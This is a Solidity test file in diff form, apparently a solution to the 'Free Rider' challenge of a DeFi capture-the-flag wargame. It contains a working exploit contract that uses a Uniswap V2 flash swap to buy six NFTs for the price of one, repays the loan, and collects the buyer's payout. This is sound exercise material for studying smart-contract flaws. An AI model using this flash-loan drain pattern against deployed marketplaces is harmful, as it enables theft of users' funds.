@@ -1,0 +1,258 @@
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.0;
+
+import "forge-std/Test.sol";
+
+import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
+import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
+import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
+import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
+import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
+import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
+import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
+import {WETH9} from "../../../src/Contracts/WETH9.sol";
+
+contract AttackerContract is ReentrancyGuard, IERC721Receiver, Test {
+    uint8 internal constant AMOUNT_OF_NFTS = 6;
+    address internal attacker;
+    address internal buyer;
+    IUniswapV2Factory internal uniswapV2Factory;
+    IUniswapV2Pair internal uniswapV2Pair;
+    FreeRiderBuyer internal freeRiderBuyer;
+    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
+
+    constructor(
+        address _attacker,
+        address _nftmarketplace,
+        address _uniswapPair,
+        address _buyer,
+        address _freeRiderBuyer,
+        address _v2factory
+    ) payable {
+        attacker = _attacker;
+        buyer = _buyer;
+        freeRiderBuyer = FreeRiderBuyer(_freeRiderBuyer);
+        uniswapV2Pair = IUniswapV2Pair(_uniswapPair);
+        uniswapV2Factory = IUniswapV2Factory(_v2factory);
+        WETH9 weth = WETH9(payable(uniswapV2Pair.token1()));
+        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(payable(_nftmarketplace));
+        weth.deposit{value: address(this).balance}();
+    }
+
+    receive() external payable {}
+    fallback() external payable {}
+
+    function startSwap() external {
+        bytes memory junk = abi.encode(1);
+        uniswapV2Pair.swap(0, 15 ether, address(this), junk);
+    }
+
+    //amount0 dvts and amount1 weths
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
+        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
+        assert(msg.sender == uniswapV2Factory.getPair(token0, token1)); // ensure that msg.sender is a V2 pair
+        // rest of the function goes here!
+        WETH9 weth = WETH9(payable(token1));
+        weth.withdraw(weth.balanceOf(address(this)));
+        uint256[] memory NFTsToBuy = new uint256[](6);
+        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
+            NFTsToBuy[i] = i;
+            unchecked {
+                ++i;
+            }
+        }
+        freeRiderNFTMarketplace.buyMany{value: 15 ether}(NFTsToBuy);
+        weth.deposit{value: address(this).balance}();
+        //payback
+        uint256 payback = (amount1 * (10 ** 3) / 997) + 1;
+        emit log_named_uint("amount1", amount1);
+        emit log_named_uint("payback", payback);
+        weth.transfer(address(uniswapV2Pair), payback);
+        //sending remaining eth back to attacker
+        emit log_named_uint("at weth balance", weth.balanceOf(address(this)));
+        weth.withdraw(weth.balanceOf(address(this)));
+        payable(attacker).transfer(address(this).balance);
+        //transferring NFT to buyer
+        DamnValuableNFT dvnft = freeRiderNFTMarketplace.token();
+        for (uint8 i = 0; i < NFTsToBuy.length;) {
+            dvnft.safeTransferFrom(address(this), address(freeRiderBuyer), NFTsToBuy[i]);
+            unchecked {
+                ++i;
+            }
+        }
+    }
+
+    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
+    function onERC721Received(address, address, uint256 _tokenId, bytes memory)
+        external
+        override
+        nonReentrant
+        returns (bytes4)
+    {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
+
+contract FreeRider is Test {
+    // The NFT marketplace will have 6 tokens, at 15 ETH each
+    uint256 internal constant NFT_PRICE = 15 ether;
+    uint8 internal constant AMOUNT_OF_NFTS = 6;
+    uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;
+
+    // The buyer will offer 45 ETH as payout for the job
+    uint256 internal constant BUYER_PAYOUT = 45 ether;
+
+    // Initial reserves for the Uniswap v2 pool
+    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
+    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
+    uint256 internal constant DEADLINE = 10_000_000;
+
+    FreeRiderBuyer internal freeRiderBuyer;
+    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
+    DamnValuableToken internal dvt;
+    DamnValuableNFT internal damnValuableNFT;
+    IUniswapV2Pair internal uniswapV2Pair;
+    IUniswapV2Factory internal uniswapV2Factory;
+    IUniswapV2Router02 internal uniswapV2Router;
+    WETH9 internal weth;
+    address payable internal buyer;
+    address payable internal attacker;
+    address payable internal deployer;
+
+    function setUp() public {
+        /**
+         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
+         */
+        buyer = payable(address(uint160(uint256(keccak256(abi.encodePacked("buyer"))))));
+        vm.label(buyer, "buyer");
+        vm.deal(buyer, BUYER_PAYOUT);
+
+        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
+        vm.label(deployer, "deployer");
+        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);
+
+        // Attacker starts with little ETH balance
+        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
+        vm.label(attacker, "Attacker");
+        vm.deal(attacker, 0.5 ether);
+
+        // Deploy WETH contract
+        weth = new WETH9();
+        vm.label(address(weth), "WETH");
+
+        // Deploy token to be traded against WETH in Uniswap v2
+        vm.startPrank(deployer);
+        dvt = new DamnValuableToken();
+        vm.label(address(dvt), "DVT");
+
+        // Deploy Uniswap Factory and Router
+        uniswapV2Factory =
+            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));
+
+        uniswapV2Router = IUniswapV2Router02(
+            deployCode(
+                "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
+            )
+        );
+
+        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
+        // Note that the function takes care of deploying the pair automatically
+        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
+        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
+            address(dvt), // token to be traded against WETH
+            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
+            0, // amountTokenMin
+            0, // amountETHMin
+            deployer, // to
+            DEADLINE // deadline
+        );
+
+        // Get a reference to the created Uniswap pair
+        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));
+
+        assertEq(uniswapV2Pair.token0(), address(dvt));
+        assertEq(uniswapV2Pair.token1(), address(weth));
+        assertGt(uniswapV2Pair.balanceOf(deployer), 0);
+
+        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);
+
+        damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());
+
+        for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
+            assertEq(damnValuableNFT.ownerOf(id), deployer);
+        }
+
+        damnValuableNFT.setApprovalForAll(address(freeRiderNFTMarketplace), true);
+
+        uint256[] memory NFTsForSell = new uint256[](6);
+        uint256[] memory NFTsPrices = new uint256[](6);
+        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
+            NFTsForSell[i] = i;
+            NFTsPrices[i] = NFT_PRICE;
+            unchecked {
+                ++i;
+            }
+        }
+
+        freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);
+
+        assertEq(freeRiderNFTMarketplace.amountOfOffers(), AMOUNT_OF_NFTS);
+        vm.stopPrank();
+
+        vm.startPrank(buyer);
+
+        freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(attacker, address(damnValuableNFT));
+
+        vm.stopPrank();
+
+        console.log(unicode"🧨 Let's see if you can break it... 🧨");
+    }
+
+    function testExploit() public {
+        /**
+         * EXPLOIT START *
+         */
+        vm.startPrank(attacker, attacker);
+        //token0 dvt and token1 weth
+        AttackerContract at = new AttackerContract{value: attacker.balance}(
+            attacker,
+            address(freeRiderNFTMarketplace),
+            address(uniswapV2Pair),
+            buyer,
+            address(freeRiderBuyer),
+            address(uniswapV2Factory)
+        );
+        at.startSwap();
+        emit log_named_uint("at balance", address(at).balance);
+        emit log_named_uint("DVNFTs of at", damnValuableNFT.balanceOf(address(at)));
+        vm.stopPrank();
+        /**
+         * EXPLOIT END *
+         */
+        validation();
+        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+    }
+
+    function validation() internal {
+        /**
+         * SUCCESS CONDITIONS
+         */
+
+        // Attacker must have earned all ETH from the payout
+        assertGt(attacker.balance, BUYER_PAYOUT);
+        assertEq(address(freeRiderBuyer).balance, 0);
+
+        // The buyer extracts all NFTs from its associated contract
+        vm.startPrank(buyer);
+        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+            damnValuableNFT.transferFrom(address(freeRiderBuyer), buyer, tokenId);
+            assertEq(damnValuableNFT.ownerOf(tokenId), buyer);
+        }
+        vm.stopPrank();
+
+        // Exchange must have lost NFTs and ETH
+        assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
+        assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
+    }
+}
